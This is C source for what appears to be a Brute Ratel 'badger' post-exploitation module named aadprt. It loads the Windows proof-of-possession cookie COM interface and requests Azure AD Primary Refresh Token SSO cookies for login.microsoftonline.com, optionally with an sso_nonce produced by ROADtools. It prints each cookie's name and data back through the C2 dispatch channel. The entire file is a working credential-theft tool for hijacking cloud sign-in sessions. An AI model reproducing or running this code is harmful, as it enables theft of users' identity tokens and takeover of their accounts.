#include "definitions.h"
#include "badger_exports.h"

// ============ Definitions Start ============

typedef struct ProofOfPossessionCookieInfo {
    LPWSTR name;
    LPWSTR data;
    DWORD flags;
    LPWSTR p3pHeader;
} ProofOfPossessionCookieInfo;

__inline void FreeProofOfPossessionCookieInfoArray(_In_reads_(cookieInfoCount) ProofOfPossessionCookieInfo* cookieInfo, DWORD cookieInfoCount) {                                                
     DWORD i;                                    
     for (i = 0; i < cookieInfoCount; i++)       
     {                                           
         CoTaskMemFree(cookieInfo[i].name);      
         CoTaskMemFree(cookieInfo[i].data);      
         CoTaskMemFree(cookieInfo[i].p3pHeader); 
     }                                           
     CoTaskMemFree(cookieInfo);                  
}   

typedef interface IProofOfPossessionCookieInfoManager IProofOfPossessionCookieInfoManager;
EXTERN_C const IID IID_IProofOfPossessionCookieInfoManager;

typedef struct IProofOfPossessionCookieInfoManagerVtbl {
	BEGIN_INTERFACE
	
	HRESULT ( STDMETHODCALLTYPE *QueryInterface )( 
		__RPC__in IProofOfPossessionCookieInfoManager * This,
		/* [in] */ __RPC__in REFIID riid,
		/* [annotation][iid_is][out] */ 
		_COM_Outptr_  void **ppvObject);
	
	ULONG ( STDMETHODCALLTYPE *AddRef )( 
		__RPC__in IProofOfPossessionCookieInfoManager * This);
	
	ULONG ( STDMETHODCALLTYPE *Release )( 
		__RPC__in IProofOfPossessionCookieInfoManager * This);
	
	HRESULT ( STDMETHODCALLTYPE *GetCookieInfoForUri )( 
		__RPC__in IProofOfPossessionCookieInfoManager * This,
		/* [in] */ __RPC__in LPCWSTR uri,
		/* [out] */ __RPC__out DWORD *cookieInfoCount,
		/* [size_is][size_is][out] */ __RPC__deref_out_ecount_full_opt(*cookieInfoCount) ProofOfPossessionCookieInfo **cookieInfo);
	
	END_INTERFACE
} IProofOfPossessionCookieInfoManagerVtbl;

interface IProofOfPossessionCookieInfoManager {
	CONST_VTBL struct IProofOfPossessionCookieInfoManagerVtbl *lpVtbl;
};


// ============ Definitions End ============


void printHelp(){
	BadgerDispatch(g_dispatch, "[*] Usage: aadprt.o <nonce>\n");
	BadgerDispatch(g_dispatch, "[*] <nonce>    (Optional argument) You can create a nonce using roadtx from ROADtools\n");
}


void requestaadprt(LPCWSTR uri) {
	BadgerDispatch(g_dispatch, "[*] Using uri: %ls\n", uri);
	DWORD cookieCount = 0;
	ProofOfPossessionCookieInfo* cookies;
	IProofOfPossessionCookieInfoManager* popCookieManager;
	GUID CLSID_ProofOfPossessionCookieInfoManager;
	GUID lIID_IProofOfPossessionCookieInfoManager;

	OLE32$CLSIDFromString(L"{A9927F85-A304-4390-8B23-A75F1C668600}", &CLSID_ProofOfPossessionCookieInfoManager);
	OLE32$IIDFromString(L"{CDAECE56-4EDF-43DF-B113-88E4556FA1BB}", &lIID_IProofOfPossessionCookieInfoManager);

	HRESULT hr = OLE32$CoInitializeEx(NULL, 0x0);
	if (hr == RPC_E_CHANGED_MODE){
		hr = OLE32$CoInitializeEx(NULL, 0x2);	
	}
	if (FAILED(hr))	{
		BadgerDispatch(g_dispatch, "[-] CoInitialize 0x%04x\n", hr);
		return;
	}

	hr = OLE32$CoCreateInstance(&CLSID_ProofOfPossessionCookieInfoManager, NULL, CLSCTX_INPROC_SERVER, &lIID_IProofOfPossessionCookieInfoManager, (void**)(&popCookieManager));
	if (FAILED(hr))	{
		BadgerDispatch(g_dispatch, "[-] CoCreateInstance 0x%4x\n", hr);;
		return;
	}

	hr = popCookieManager->lpVtbl->GetCookieInfoForUri(popCookieManager, uri, &cookieCount, &cookies);
	if (FAILED(hr))	{
		BadgerDispatch(g_dispatch, "[-] GetCookieInfoForUri 0x%4x\n", hr);
		return;
	}

	if (cookieCount == 0) {
		BadgerDispatch(g_dispatch, "[*] No cookies for the URI\n");
		return;
	}

	for (DWORD i = 0; i < cookieCount; i++) {
		BadgerDispatch(g_dispatch, "Name %ls\n", cookies[i].name);
		BadgerDispatch(g_dispatch, "Data: %ls\n", cookies[i].data);
		BadgerDispatch(g_dispatch, "Flags: %x\n", cookies[i].flags);
		BadgerDispatch(g_dispatch, "P3PHeader: %ls\n\n", cookies[i].p3pHeader);

		OLE32$CoTaskMemFree(cookies[i].name);
		OLE32$CoTaskMemFree(cookies[i].data);
		OLE32$CoTaskMemFree(cookies[i].p3pHeader);
	}
	OLE32$CoTaskMemFree(cookies);
}

void coffee(char** argv, int argc, WCHAR** dispatch){
	wchar_t * nonce = NULL;

	g_dispatch = dispatch;

	// Help check
	for (int i = 0; i < argc; i++) {
		if(BadgerStrcmp(argv[i], "-h") == 0){
			printHelp();
			return;
		}
	}

    // Optional argument nonce
    if (argc >= 1) {
        LPSTR pszNonce = argv[0];
        
		int cch = KERNEL32$MultiByteToWideChar(CP_UTF8, 0, pszNonce, -1, NULL, 0);
		if (cch <= 0) {
			BadgerDispatch(g_dispatch, "[-] MultiByteToWideChar(size) failed.\n");
			goto cleanup;
		}

        nonce = (wchar_t *)BadgerAlloc((size_t)cch * sizeof(wchar_t));
		if (!nonce) {
			BadgerDispatch(g_dispatch, "[-] BadgerAlloc failed for nonce.\n");
			goto cleanup;
		}

		if (KERNEL32$MultiByteToWideChar(CP_UTF8, 0, pszNonce, -1, nonce, cch) <= 0) {
			BadgerDispatch(g_dispatch, "[-] MultiByteToWideChar(conv) failed.\n");
			goto cleanup;
		}
    }

	LPCWSTR uri = L"https://login.microsoftonline.com/";
	wchar_t * full_uri = NULL;

	if (nonce) {
		LPCWSTR base_url = L"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=";

		size_t base_len  = BadgerWcslen((WCHAR*)base_url);
		size_t nonce_len = BadgerWcslen((WCHAR*)nonce);
		size_t total_cch = base_len + nonce_len + 1;

		full_uri = (wchar_t *)BadgerAlloc(total_cch * sizeof(wchar_t));
		if (!full_uri) {
			BadgerDispatch(g_dispatch, "[-] BadgerAlloc failed for full_uri.\n");
			goto cleanup;
		}

		KERNEL32$lstrcpynW(full_uri, base_url, (int)(base_len + 1));
		KERNEL32$lstrcpynW(full_uri + base_len, nonce, (int)(nonce_len + 1));

		uri = full_uri;
	}

	requestaadprt(uri);

cleanup:
    if(nonce) BadgerFree((PVOID*)&nonce);
    if(full_uri) BadgerFree((PVOID*)&full_uri);
}
